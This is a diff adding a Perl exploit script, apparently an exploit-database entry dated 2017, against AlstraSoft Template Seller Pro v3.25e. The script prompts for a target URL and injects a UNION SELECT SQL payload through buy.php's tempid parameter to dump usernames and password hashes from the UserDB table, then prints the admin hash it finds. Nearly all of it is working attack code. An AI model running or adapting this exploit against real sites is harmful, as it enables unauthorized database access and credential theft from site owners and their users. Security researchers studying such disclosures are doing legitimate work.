@@ -1,0 +1,44 @@
+#!/usr/bin/perl -w
+# # # # # 
+# Exploit Title: AlstraSoft Template Seller Pro v3.25e Script (buy.php)- Remote SQL Injection Vulnerability
+# Google Dork: N/A
+# Date: 04.02.2017
+# Vendor Homepage: http://www.alstrasoft.com/
+# Software Buy: http://www.alstrasoft.com/template.htm
+# Demo: http://blizsoft.com/templates/
+# Version: 3.25e
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[beygir]ihsan[nokta]net
+# # # # #
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+print "|----------------------------------------------------|\n";
+print "| Template Seller Pro v3.25e Remote SQL Injector     |\n";
+print "| Author: Ihsan Sencan                               |\n";
+print "| Author Web: http://ihsan.net                       |\n";
+print "| Mail : ihsan[beygir]ihsan[nokta]net                |\n";
+print "|                                                    |\n";
+print "|                                                    |\n";
+print "|----------------------------------------------------|\n";
+use LWP::UserAgent;
+print "\nInsert Target:[http://wwww.site.com/path/]: ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress...\n";
+print "\n";
+$elicha="group_concat(user_name,char(58),user_password)";
+$table="UserDB";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target . "buy.php?tempid=-1+union+select+1,2,3,".$elicha.",5,6,7,8+from/**/".$table."+--+";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
+print "\n[+] Admin Hash : $1\n";
+print "[+] Success !!\n";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
